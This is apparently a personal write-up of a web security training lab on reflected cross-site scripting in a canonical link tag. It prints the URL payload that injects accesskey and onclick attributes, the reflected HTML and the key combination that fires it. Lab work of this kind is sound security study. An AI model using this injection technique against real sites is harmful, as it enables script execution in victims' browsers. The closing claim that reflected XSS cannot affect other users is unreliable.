### Lab: Reflected XSS in canonical link tag

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

- ALT+SHIFT+X
- CTRL+ALT+X
- Alt+X

Please note that the intended solution to this lab is only possible in Chrome.

_____

Analysis and Exploit:

1. POSTed a test comment and used BurpSuite to find where the user input was reflected:
```html
<section class="comment">
    <p>
        <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http://test">attacker</a> | 27 April 2023
   </p>
    <p>Test comment #1 &lt;TAG&gt;</p>
    <p></p>
</section>
```

2. Appending the payload ```?%27accesskey=%27x%27onclick=%27alert(1)``` to the URL ```https://[LAB-ID]].web-security-academy.net/``` results in the payload being reflected in the HTML header of the home page 
```html
<link rel="canonical" href='https://0a900001038b810781282aec002700f9.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```

3. Pressing the key combination ALT+SHIFT+X (on Windows) triggers the _onclick_ event and the alert pops up.  

Since it is a reflected XSS, the payload lives in the browser and does not impact any other user browsing the website.  

